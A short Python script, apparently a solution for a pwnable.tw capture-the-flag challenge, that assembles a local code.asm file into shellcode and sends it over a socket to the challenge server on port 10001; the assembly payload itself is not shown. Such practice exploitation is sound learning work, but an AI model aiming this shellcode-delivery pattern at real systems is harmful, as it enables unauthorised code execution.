import socket, subprocess

proc = subprocess.run(r"nasm code.asm ;  xxd -p code |tr -d '\n' | sed 's/\(..\)/\\x\1/g'",capture_output=True, shell=True)
shellcode = bytes.fromhex(proc.stdout.decode('ascii').replace('\\x',''))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw",10001))
print(s.recv(100))

s.send(shellcode)
print(s.recv(100))
